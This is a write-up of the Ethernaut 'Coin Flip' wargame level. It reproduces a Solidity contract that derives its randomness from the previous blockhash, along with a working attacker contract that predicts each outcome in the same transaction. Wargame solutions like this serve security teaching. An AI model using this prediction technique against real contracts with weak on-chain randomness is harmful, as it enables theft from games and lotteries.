[3 - Coin Flip](https://ethernaut.openzeppelin.com/level/0x9240670dbd6476e6a32055E52A0b0756abd26fd2)

Solution: 
* if we would know the block number beforehand, we could easily follow the same algorithm and compute what side to guess. Unfortunately we can't get it accurately from Javascript, with trivial methods
* the key here is that if an EOA account starts a transaction to contract A, which then calls contract B, these calls are all in the same transaction => in the same block => we create another contract which computes the correct side, and then calls flip on the CoinFlip contract.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

contract CoinFlipSolution {
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip private constant coinFlipContract = CoinFlip(0x3636ab089E0740101F97b1D2e827d2Ee8d78D8E8);

    function solve() external {
         uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
    }
}
```
* I deployed this using Remix IDE, and then called CoinFlipSolution.solve() 10 different times.